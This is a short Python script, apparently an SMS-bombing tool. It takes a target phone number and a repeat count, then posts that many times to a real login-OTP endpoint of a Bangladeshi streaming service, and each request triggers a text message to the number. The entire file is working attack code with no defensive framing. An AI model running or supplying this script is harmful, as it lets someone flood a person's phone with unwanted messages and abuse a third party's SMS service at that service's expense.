import requests

number = int (input("Enter Your Number :"))

thre = int (input( " Enter Your TRe Number : "))

for i in range (thre) :

    response = requests.post( "https://api2.bongobd.com/api/login/send-otp",data={"operator":"all","msisdn":number})

    if response.status_code == 200 :
        print ("sms sent")

    else :
        print ("failed")
